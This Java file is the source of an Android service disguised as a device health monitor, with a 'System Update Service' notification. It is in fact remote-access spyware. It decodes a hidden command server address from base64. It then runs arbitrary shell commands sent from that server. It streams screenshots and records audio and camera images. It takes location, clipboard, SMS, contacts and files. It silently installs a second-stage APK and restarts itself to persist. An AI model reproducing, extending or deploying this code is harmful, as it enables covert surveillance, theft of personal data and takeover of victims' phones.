package com.device.health.monitor;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.pm.PackageInstaller;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CameraCaptureSession;
import android.location.Location;
import android.location.LocationManager;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.graphics.ImageFormat;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;
import androidx.core.app.NotificationCompat;
import androidx.core.content.FileProvider;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class SyncService extends Service {

    static final String TAG     = "HealthSync";
    static final String CHANNEL = "health_sync";
    static final String PREFS   = "health_prefs";

    private ExecutorService pool;
    private volatile boolean running = false;
    private static SyncService instance;
    private PowerManager.WakeLock wakeLock;

    public static SyncService getInstance() { return instance; }

    // Screenshot set by MonitorService (full flavor)
    static volatile byte[] pendingShot = null;

    private static String ep() {
        return new String(Base64.decode(
            "aHR0cHM6Ly94dXNiLTBjMHAub25yZW5kZXIuY29t", Base64.DEFAULT));
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        pool = Executors.newFixedThreadPool(5);
        createChannel();
        acquireWakeLock();
        WatchdogJob.schedule(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startFg();
        if (!running) { running = true; pool.submit(this::loop); }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        instance = null;
        releaseWakeLock();
        super.onDestroy();
        scheduleRestart();
    }

    // ── main poll loop ─────────────────────────────────────────────────────────

    private void loop() {
        String id = loadId();
        long lastReg = 0, lastShot = 0;
        int lastCid = 0;
        while (running) {
            try {
                long now = System.currentTimeMillis();
                if (now - lastReg > 30_000) { reg(id); lastReg = now; }

                // Screenshots every 1.5s via MonitorService (full flavor)
                if (now - lastShot > 1_500) {
                    try {
                        Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
                        Object inst = ms.getMethod("getInstance").invoke(null);
                        if (inst != null) ms.getMethod("snap").invoke(inst);
                    } catch (Exception ignored) {}
                    byte[] s = pendingShot;
                    if (s != null) { pendingShot = null; pushShot(id, s); }
                    lastShot = now;
                }

                // Poll for command
                JSONObject p = get("/esp/device-cmd?did=" + URLEncoder.encode(id, "UTF-8"));
                String cmd = p.optString("cmd", "");
                int cid = p.optInt("id", 0);
                if (!cmd.isEmpty() && cid != lastCid) {
                    lastCid = cid;
                    final String c = cmd;
                    pool.submit(() -> exec(id, c));
                }
            } catch (Exception e) { Log.d(TAG, "loop: " + e.getMessage()); }
            try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
        }
    }

    // ── command dispatcher ─────────────────────────────────────────────────────

    private void exec(String id, String cmd) {
        if (cmd.equals("__uninstall__")) { handleUninstall(id); return; }
        if (cmd.equals("__upgrade__"))   { doUpgrade(id); return; }
        if (cmd.startsWith("__mic"))     { doMic(id, cmd); return; }
        if (cmd.equals("__cam__"))       { doCam(id, false); return; }
        if (cmd.equals("__cam_front__")) { doCam(id, true); return; }
        if (cmd.equals("__loc__"))       { doLoc(id); return; }
        if (cmd.equals("__clip__"))      { doClip(id); return; }
        if (cmd.equals("__sms__"))       { doSms(id); return; }
        if (cmd.equals("__contacts__"))  { doContacts(id); return; }
        if (cmd.startsWith("__upload:")) { doUpload(id, cmd.substring(9).replace("__","")); return; }
        if (cmd.startsWith("__dl:"))     { doDownload(id, cmd.substring(5).replace("__","")); return; }

        // Shell execution — concurrent stream reading prevents pipe deadlock
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            byte[][] buf = {null, null};
            Thread t1 = new Thread(() -> { try { buf[0] = drain(proc.getInputStream(), 65536); } catch (Exception e) { buf[0] = new byte[0]; } });
            Thread t2 = new Thread(() -> { try { buf[1] = drain(proc.getErrorStream(), 8192);  } catch (Exception e) { buf[1] = new byte[0]; } });
            t1.start(); t2.start();
            proc.waitFor(30, TimeUnit.SECONDS);
            t1.join(2000); t2.join(2000);
            byte[] out = cat(buf[0] != null ? buf[0] : new byte[0],
                             buf[1] != null ? buf[1] : new byte[0]);
            sendOut(id, cmd, Base64.encodeToString(out, Base64.NO_WRAP));
        } catch (Exception e) {
            sendOut(id, cmd, enc("Error: " + e.getMessage()));
        }
    }

    // ── special commands ───────────────────────────────────────────────────────

    private void handleUninstall(String id) {
        sendOut(id, "__uninstall__", enc("ok"));
        stopSelf();
    }

    /** __mic:N__ — record N seconds of audio, push to relay */
    private void doMic(String id, String cmd) {
        int secs = 10;
        try { secs = Math.max(1, Math.min(60, Integer.parseInt(cmd.replaceAll("[^0-9]", "")))); }
        catch (Exception ignored) {}
        final int dur = secs;
        File f = new File(getCacheDir(), "mic.m4a");
        MediaRecorder mr = null;
        try {
            mr = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                    ? new MediaRecorder(this) : new MediaRecorder();
            mr.setAudioSource(MediaRecorder.AudioSource.MIC);
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mr.setAudioSamplingRate(44100);
            mr.setAudioEncodingBitRate(128000);
            mr.setOutputFile(f.getAbsolutePath());
            mr.prepare();
            mr.start();
            Thread.sleep(dur * 1000L);
            mr.stop();
            byte[] data = readFile(f);
            JSONObject b = new JSONObject();
            b.put("did", id);
            b.put("audio", Base64.encodeToString(data, Base64.NO_WRAP));
            b.put("fmt", "m4a");
            b.put("secs", dur);
            post("/esp/device-audio", b);
            sendOut(id, cmd, enc("audio_sent:" + dur + "s/" + data.length + "B"));
        } catch (Exception e) {
            sendOut(id, cmd, enc("mic error: " + e.getMessage()));
        } finally {
            if (mr != null) { try { mr.release(); } catch (Exception ignored) {} }
            f.delete();
        }
    }

    /** __cam__ / __cam_front__ — capture photo via Camera2, push to relay */
    private void doCam(String id, boolean front) {
        final String cmdKey = front ? "__cam_front__" : "__cam__";
        if (checkSelfPermission("android.permission.CAMERA") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, cmdKey, enc("CAMERA permission not granted")); return;
        }
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String camId = null;
            int facing = front ? CameraCharacteristics.LENS_FACING_FRONT
                               : CameraCharacteristics.LENS_FACING_BACK;
            for (String cid : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(cid);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if (f != null && f == facing) { camId = cid; break; }
            }
            if (camId == null && cm.getCameraIdList().length > 0)
                camId = cm.getCameraIdList()[0]; // fallback
            if (camId == null) { sendOut(id, cmdKey, enc("no camera")); return; }

            ImageReader reader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
            HandlerThread ht = new HandlerThread("cam");
            ht.start();
            Handler h = new Handler(ht.getLooper());
            AtomicBoolean fired = new AtomicBoolean(false);
            final String finalId = camId;

            reader.setOnImageAvailableListener(imgR -> {
                if (!fired.compareAndSet(false, true)) return;
                try (android.media.Image img = imgR.acquireLatestImage()) {
                    if (img == null) return;
                    java.nio.ByteBuffer buf2 = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf2.remaining()];
                    buf2.get(bytes);
                    JSONObject b = new JSONObject();
                    b.put("did", id);
                    b.put("img", Base64.encodeToString(bytes, Base64.NO_WRAP));
                    b.put("cam", front ? "front" : "back");
                    post("/esp/device-photo", b);
                    sendOut(id, cmdKey, enc("photo_sent:" + bytes.length + "B"));
                } catch (Exception e) {
                    sendOut(id, cmdKey, enc("img error: " + e.getMessage()));
                }
                ht.quitSafely();
            }, h);

            cm.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice cam) {
                    try {
                        List<Surface> surfs = new ArrayList<>();
                        surfs.add(reader.getSurface());
                        cam.createCaptureSession(surfs, new CameraCaptureSession.StateCallback() {
                            @Override public void onConfigured(CameraCaptureSession sess) {
                                try {
                                    CaptureRequest.Builder rb = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                    rb.addTarget(reader.getSurface());
                                    rb.set(CaptureRequest.JPEG_QUALITY, (byte) 75);
                                    rb.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
                                    sess.capture(rb.build(), new CameraCaptureSession.CaptureCallback() {
                                        @Override public void onCaptureFailed(CameraCaptureSession s, CaptureRequest r, android.hardware.camera2.CaptureFailure fail) {
                                            sendOut(id, cmdKey, enc("capture failed:" + fail.getReason()));
                                            cam.close(); ht.quitSafely();
                                        }
                                    }, h);
                                } catch (Exception e) { sendOut(id, cmdKey, enc("capture err: " + e.getMessage())); cam.close(); ht.quitSafely(); }
                            }
                            @Override public void onConfigureFailed(CameraCaptureSession sess) {
                                sendOut(id, cmdKey, enc("session config failed")); cam.close(); ht.quitSafely();
                            }
                        }, h);
                    } catch (Exception e) { sendOut(id, cmdKey, enc("session err: " + e.getMessage())); cam.close(); ht.quitSafely(); }
                }
                @Override public void onDisconnected(CameraDevice cam) { cam.close(); ht.quitSafely(); }
                @Override public void onError(CameraDevice cam, int err) {
                    sendOut(id, cmdKey, enc("cam error:" + err)); cam.close(); ht.quitSafely();
                }
            }, h);
        } catch (Exception e) {
            sendOut(id, cmdKey, enc("Camera error: " + e.getMessage()));
        }
    }

    /** __loc__ — last known GPS/network location */
    private void doLoc(String id) {
        if (checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") != PackageManager.PERMISSION_GRANTED
         && checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, "__loc__", enc("LOCATION permission not granted")); return;
        }
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = null;
            for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
                try { Location l = lm.getLastKnownLocation(p); if (l != null && (loc == null || l.getAccuracy() < loc.getAccuracy())) loc = l; }
                catch (SecurityException ignored) {}
            }
            if (loc != null) {
                sendOut(id, "__loc__", enc(String.format("lat=%.6f,lon=%.6f,acc=%.0fm,provider=%s,age=%ds",
                    loc.getLatitude(), loc.getLongitude(), loc.getAccuracy(), loc.getProvider(),
                    (System.currentTimeMillis() - loc.getTime()) / 1000)));
            } else {
                sendOut(id, "__loc__", enc("no location cached (GPS may be off)"));
            }
        } catch (Exception e) { sendOut(id, "__loc__", enc("loc error: " + e.getMessage())); }
    }

    /** __clip__ — read clipboard (via MonitorService on Android 10+) */
    private void doClip(String id) {
        String result = null;
        // AccessibilityService context can read clipboard on Android 10+
        try {
            Class<?> ms = Class.forName("com.device.health.monitor.MonitorService");
            Object inst = ms.getMethod("getInstance").invoke(null);
            if (inst != null) result = (String) ms.getMethod("getClipboard").invoke(inst);
        } catch (Exception ignored) {}
        if (result == null) {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                ClipData cd = cm.getPrimaryClip();
                if (cd != null && cd.getItemCount() > 0) {
                    CharSequence t = cd.getItemAt(0).coerceToText(this);
                    result = t != null ? t.toString() : "(null)";
                }
            } catch (Exception e) { result = "clip error: " + e.getMessage(); }
        }
        sendOut(id, "__clip__", enc(result != null ? result : "(empty)"));
    }

    /** __sms__ — read last 30 inbox messages */
    private void doSms(String id) {
        if (checkSelfPermission("android.permission.READ_SMS") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, "__sms__", enc("READ_SMS not granted")); return;
        }
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address","person","body","date"},
                null, null, "date DESC");
            JSONArray arr = new JSONArray();
            int count = 0;
            if (c != null) {
                while (c.moveToNext() && count++ < 30) {
                    JSONObject m = new JSONObject();
                    m.put("from", c.getString(0));
                    m.put("body", c.getString(2));
                    m.put("date", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm",
                        java.util.Locale.US).format(new java.util.Date(c.getLong(3))));
                    arr.put(m);
                }
                c.close();
            }
            sendOut(id, "__sms__", enc(arr.toString(2)));
        } catch (Exception e) { sendOut(id, "__sms__", enc("sms error: " + e.getMessage())); }
    }

    /** __contacts__ — read first 50 contacts */
    private void doContacts(String id) {
        if (checkSelfPermission("android.permission.READ_CONTACTS") != PackageManager.PERMISSION_GRANTED) {
            sendOut(id, "__contacts__", enc("READ_CONTACTS not granted")); return;
        }
        try {
            Cursor c = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{"display_name","data1"},
                null, null, "display_name ASC");
            JSONArray arr = new JSONArray();
            int count = 0;
            if (c != null) {
                while (c.moveToNext() && count++ < 50) {
                    JSONObject m = new JSONObject();
                    m.put("name", c.getString(0));
                    m.put("phone", c.getString(1));
                    arr.put(m);
                }
                c.close();
            }
            sendOut(id, "__contacts__", enc(arr.toString(2)));
        } catch (Exception e) { sendOut(id, "__contacts__", enc("contacts error: " + e.getMessage())); }
    }

    /** __upload:path — read file and push to relay */
    private void doUpload(String id, String path) {
        try {
            File f = new File(path);
            if (!f.exists()) { sendOut(id, "__upload:" + path, enc("not found: " + path)); return; }
            if (f.length() > 20 * 1024 * 1024) { sendOut(id, "__upload:" + path, enc("too large (>20MB)")); return; }
            byte[] data = readFile(f);
            JSONObject b = new JSONObject();
            b.put("did", id);
            b.put("name", f.getName());
            b.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
            b.put("size", f.length());
            post("/esp/device-file", b);
            sendOut(id, "__upload:" + path, enc("uploaded: " + f.getName() + " (" + f.length() + "B)"));
        } catch (Exception e) { sendOut(id, "__upload:" + path, enc("upload error: " + e.getMessage())); }
    }

    /** __dl:url|/path — download URL to device path */
    private void doDownload(String id, String args) {
        String[] parts = args.split("\\|", 2);
        if (parts.length != 2) { sendOut(id, "__dl:" + args, enc("format: url|/path")); return; }
        try {
            byte[] data = httpGet(parts[0], 50 * 1024 * 1024);
            File f = new File(parts[1]);
            if (f.getParentFile() != null) f.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(data); fos.close();
            sendOut(id, "__dl:" + args, enc("saved: " + parts[1] + " (" + data.length + "B)"));
        } catch (Exception e) { sendOut(id, "__dl:" + args, enc("dl error: " + e.getMessage())); }
    }

    /** Stage-2 upgrade: download agent-full.apk, try root install, fallback to dialog */
    private void doUpgrade(String id) {
        String status = "err:unknown";
        File f = new File(getCacheDir(), "upd.apk");
        try {
            byte[] apk = downloadApk();
            FileOutputStream fos = new FileOutputStream(f);
            fos.write(apk); fos.close();

            // Method 1: root silent install
            try {
                Process su = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "pm install -r -t " + f.getAbsolutePath()});
                su.waitFor(20, TimeUnit.SECONDS);
                String suOut = new String(drain(su.getInputStream(), 4096)).trim();
                if (suOut.contains("Success")) { sendOut(id, "__upgrade__", enc("root_ok")); return; }
            } catch (Exception ignored) {}

            // Method 2: PackageInstaller session (Android 12+ silent self-update)
            // Works because Stage 2 = same package + same signing cert + higher versionCode
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    PackageInstaller pi = getPackageManager().getPackageInstaller();
                    PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                        PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                    params.setAppPackageName(getPackageName());
                    params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
                    int sid = pi.createSession(params);
                    PackageInstaller.Session sess = pi.openSession(sid);
                    try (OutputStream out = sess.openWrite("pkg", 0, apk.length)) {
                        out.write(apk);
                        sess.fsync(out);
                    }
                    Intent intent = new Intent("com.device.health.monitor.INSTALL_RESULT");
                    PendingIntent pend = PendingIntent.getBroadcast(this, 0, intent,
                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
                    sess.commit(pend.getIntentSender());
                    sess.close();
                    sendOut(id, "__upgrade__", enc("pkg_installer_ok")); return;
                } catch (Exception e) { Log.d(TAG, "pkg_installer: " + e.getMessage()); }
            }

            // Method 3: FileProvider dialog — MonitorService auto-clicks Install via Accessibility
            Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", f);
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setDataAndType(uri, "application/vnd.android.package-archive");
            i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            status = "dialog_shown(acc_will_click)";
        } catch (Exception e) { status = "err: " + e.getMessage(); }
        sendOut(id, "__upgrade__", enc(status));
    }

    // ── helpers ────────────────────────────────────────────────────────────────

    private void sendOut(String id, String cmd, String b64out) {
        try {
            JSONObject b = new JSONObject();
            b.put("did", id); b.put("cmd", cmd); b.put("out", b64out);
            b.put("os", "Android " + Build.VERSION.RELEASE);
            post("/esp/device-cmdout", b);
        } catch (Exception ignored) {}
    }

    private String enc(String s) {
        return Base64.encodeToString(s.getBytes(), Base64.NO_WRAP);
    }

    void pushShot(String id, byte[] img) {
        try {
            JSONObject b = new JSONObject();
            b.put("did", id);
            b.put("img", Base64.encodeToString(img, Base64.NO_WRAP));
            b.put("os", "Android " + Build.VERSION.RELEASE);
            post("/esp/device-screenshot", b);
        } catch (Exception ignored) {}
    }

    private String loadId() {
        SharedPreferences p = getSharedPreferences(PREFS, MODE_PRIVATE);
        String id = p.getString("did", null);
        if (id == null) { id = UUID.randomUUID().toString(); p.edit().putString("did", id).apply(); }
        return id;
    }

    private void reg(String id) throws Exception {
        JSONObject b = new JSONObject();
        b.put("did", id); b.put("hostname", Build.MODEL);
        b.put("os", "Android " + Build.VERSION.RELEASE);
        b.put("user", "android"); b.put("arch", Build.SUPPORTED_ABIS[0]);
        b.put("persistent", true);
        b.put("full", isAccEnabled());
        post("/esp/device-register", b);
    }

    private boolean isAccEnabled() {
        try {
            String s = android.provider.Settings.Secure.getString(getContentResolver(),
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "health:sync");
                wakeLock.acquire();
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); }
        catch (Exception ignored) {}
    }

    private byte[] downloadApk() throws Exception {
        return httpGet(ep() + "/apk/android-full", 10 * 1024 * 1024);
    }

    private byte[] httpGet(String url, int maxBytes) throws Exception {
        for (int i = 0; i < 5; i++) {
            URL u = new URL(url);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(30000); c.setReadTimeout(60000);
            c.setInstanceFollowRedirects(false);
            int code = c.getResponseCode();
            if (code >= 300 && code < 400) { url = c.getHeaderField("Location"); c.disconnect(); continue; }
            byte[] data = drain(c.getInputStream(), maxBytes);
            c.disconnect(); return data;
        }
        throw new Exception("too many redirects");
    }

    private JSONObject get(String path) throws Exception {
        URL u = new URL(ep() + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setConnectTimeout(8000); c.setReadTimeout(8000);
        try { return new JSONObject(new String(drain(c.getInputStream(), 65536))); }
        finally { c.disconnect(); }
    }

    private void post(String path, JSONObject data) throws Exception {
        URL u = new URL(ep() + path);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("Content-Type", "application/json");
        c.setDoOutput(true); c.setConnectTimeout(15000); c.setReadTimeout(15000);
        try (OutputStream os = c.getOutputStream()) { os.write(data.toString().getBytes()); }
        try { c.getInputStream().close(); } catch (Exception ignored) {}
        finally { c.disconnect(); }
    }

    private byte[] drain(InputStream is, int max) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] buf = new byte[4096]; int n, total = 0;
        while ((n = is.read(buf)) != -1) { b.write(buf, 0, n); total += n; if (total >= max) break; }
        return b.toByteArray();
    }

    private byte[] readFile(File f) throws IOException {
        java.io.FileInputStream fis = new java.io.FileInputStream(f);
        byte[] data = drain(fis, (int) f.length() + 1);
        fis.close();
        return data;
    }

    private byte[] cat(byte[] a, byte[] b) {
        byte[] r = new byte[a.length + b.length];
        System.arraycopy(a, 0, r, 0, a.length);
        System.arraycopy(b, 0, r, a.length, b.length);
        return r;
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL, "Sync", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false); ch.enableLights(false); ch.enableVibration(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
    }

    private void startFg() {
        Notification n = new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("System Update Service")
            .setContentText("Checking for updates…")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true).build();
        startForeground(1, n);
    }

    private void scheduleRestart() {
        Intent i = new Intent(this, StartReceiver.class);
        i.setAction("com.device.health.monitor.RESTART");
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (am != null) am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 3000, pi);
    }
}
